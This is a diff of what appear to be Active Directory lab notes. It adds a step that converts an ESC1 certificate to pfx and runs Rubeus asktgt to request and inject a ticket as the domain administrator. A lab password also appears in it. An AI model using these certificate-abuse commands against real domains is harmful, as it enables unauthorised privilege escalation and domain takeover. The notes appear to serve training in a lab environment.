@@ -921,6 +921,16 @@ C:\AD\Tools\openssl\openssl.exe pkcs12 -in C:\AD\Tools\esc1.pem -keyex -CSP "Mic
 ```
 
 
-> If you are asked for a password in the lab, use **secretpassword123** or **secretpass**
+> If you are asked for a password in the lab, use **secretpassword123**
+
+
+
+- Convert from cert.pem to pfx (esc1.pfx below) and use it to request a TGT for DA (or EA).
+
+```powershell
+Rubeus.exe asktgt /user:administrator /certificate:esc1.pfx /password:SecretPass@123 /ptt
+```
+
+
 
 
